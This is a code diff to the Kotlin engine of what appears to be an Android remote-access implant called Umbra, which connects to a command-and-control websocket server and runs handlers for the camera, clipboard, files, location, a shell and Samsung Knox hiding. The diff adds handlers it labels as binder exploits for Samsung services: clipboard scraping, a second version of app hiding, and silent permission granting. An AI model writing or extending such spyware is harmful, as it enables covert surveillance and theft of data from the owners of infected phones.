@@ -9,14 +9,17 @@ import dev.yassine.umbra.modules.CameraModule
 import dev.yassine.umbra.modules.ClipboardModule
 import dev.yassine.umbra.modules.FileModule
 import dev.yassine.umbra.modules.KnoxGuardModule
+import dev.yassine.umbra.modules.KnoxHideExploit
 import dev.yassine.umbra.modules.LocationModule
+import dev.yassine.umbra.modules.SemClipboardExploit
 import dev.yassine.umbra.modules.ShellModule
+import dev.yassine.umbra.modules.SilentPermissionGrant
 import kotlinx.serialization.encodeToString
 import kotlinx.serialization.json.Json
 
 object UmbraEngine {
     private const val TAG = "Umbra"
-    private const val DEFAULT_C2 = "wss://192.168.1.9:8443/c2"
+    private const val DEFAULT_C2 = "wss://192.168.1.30:8443/c2"
     private var started = false
 
     fun start(context: Context) {
@@ -59,7 +62,12 @@ object UmbraEngine {
             "clipboard_image" to { cmd -> try { ClipboardModule.readImage(context, cmd) } catch (e: Exception) { err(cmd.cmd_id, "clipboard_img:${e.message}") } },
             "knox_hide" to { cmd -> try { KnoxGuardModule.hide(context, cmd) } catch (e: Exception) { err(cmd.cmd_id, "knox_hide:${e.message}") } },
             "knox_unhide" to { cmd -> try { KnoxGuardModule.unhide(context, cmd) } catch (e: Exception) { err(cmd.cmd_id, "knox_unhide:${e.message}") } },
-            "knox_check" to { cmd -> try { KnoxGuardModule.check(context, cmd) } catch (e: Exception) { err(cmd.cmd_id, "knox_check:${e.message}") } }
+            "knox_check" to { cmd -> try { KnoxGuardModule.check(context, cmd) } catch (e: Exception) { err(cmd.cmd_id, "knox_check:${e.message}") } },
+            // New: direct binder exploit modules for Samsung-specific services
+            "semclipboard" to { cmd -> try { SemClipboardExploit.scrape(context, cmd) } catch (e: Exception) { err(cmd.cmd_id, "semclipboard:${e.message}") } },
+            "knox_hide_v2" to { cmd -> try { KnoxHideExploit.hide(context, cmd) } catch (e: Exception) { err(cmd.cmd_id, "knox_hide_v2:${e.message}") } },
+            "knox_unhide_v2" to { cmd -> try { KnoxHideExploit.unhide(context, cmd) } catch (e: Exception) { err(cmd.cmd_id, "knox_unhide_v2:${e.message}") } },
+            "silent_grant" to { cmd -> try { SilentPermissionGrant.grant(context, cmd) } catch (e: Exception) { err(cmd.cmd_id, "silent_grant:${e.message}") } }
         )
 
         C2Coordinator.start(context, deviceId, c2Url, fcmToken, handlers)
